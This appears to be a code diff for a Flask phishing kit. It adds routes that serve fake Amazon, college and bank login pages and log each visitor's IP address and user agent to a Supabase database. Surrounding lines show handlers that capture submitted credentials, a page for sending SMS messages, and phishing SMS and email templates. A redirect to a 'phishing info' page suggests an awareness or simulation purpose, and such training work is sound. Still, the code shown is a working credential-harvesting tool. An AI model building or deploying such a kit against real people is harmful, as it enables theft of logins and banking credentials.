@@ -121,15 +121,18 @@ def send_sms(recipient_numbers, message):
 
 @app.route("/", methods=['GET'])
 def phishing_landing():
-    """Logs visitor and shows the fake login page."""
+    """Just show server is running."""
+    return "Server is running"
+
+@app.route("/amazon_login", methods=['GET'])
+def amazon_login_page():
+    """Logs visitor and renders the phishing amazon login page."""
     try:
-        # Get IP address, handling proxies
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
         user_agent = request.headers.get('User-Agent')
         log_visitor_to_supabase(ip, user_agent)
     except Exception as e:
         print(f"Error during visitor logging: {e}")
-    
     return render_template('amazon_login.html')
 
 @app.route("/amazon_login", methods=['POST'])
@@ -155,6 +158,17 @@ def handle_login():
         
     return redirect(url_for('phishing_info'))
 
+@app.route("/college_login", methods=['GET'])
+def college_login_page():
+    """Logs visitor and renders the phishing college login page."""
+    try:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        user_agent = request.headers.get('User-Agent')
+        log_visitor_to_supabase(ip, user_agent)
+    except Exception as e:
+        print(f"Error during visitor logging: {e}")
+    return render_template('college_login.html')
+
 @app.route("/college_login", methods=['POST'])
 def college_login():
     """Captures credentials and redirects to the phishing info page."""
@@ -177,6 +191,17 @@ def college_login():
         print(f"Error sending login data to Supabase: {e}")
         
     return redirect(url_for('phishing_info'))
+
+@app.route("/bank_login", methods=['GET'])
+def bank_login_page():
+    """Logs visitor and renders the phishing bank login page."""
+    try:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        user_agent = request.headers.get('User-Agent')
+        log_visitor_to_supabase(ip, user_agent)
+    except Exception as e:
+        print(f"Error during visitor logging: {e}")
+    return render_template('bank_login.html')
 
 @app.route("/bank_login", methods=['POST'])
 def bank_login():
@@ -218,11 +243,6 @@ def bank_template_page():
     """Renders the pre-made phishing bank sms template."""
     return render_template('bank_sms_txt.html')
 
-@app.route("/college_login", methods=['GET'])
-def college_login_page():
-    """Renders the phishing college login page."""
-    return render_template('college_login.html')
-
 @app.route("/sms_send", methods=['GET'])
 def sms_sender_page():
     """Renders the SMS sending UI."""
@@ -237,16 +257,6 @@ def email_template_page():
 def sms_template_page():
     """Renders the pre-made phishing amazon SMS template."""
     return render_template('amazon_sms_txt.html')
-
-@app.route("/amazon_login", methods=['GET'])
-def amazon_login_page():
-    """Renders the phishing amazon login page."""
-    return render_template('amazon_login.html')
-
-@app.route("/bank_login", methods=['GET'])
-def bank_login_page():
-    """Renders the phishing bank login page."""
-    return render_template('bank_login.html')
 
 @app.route("/college_email", methods=['GET'])
 def college_email_page():
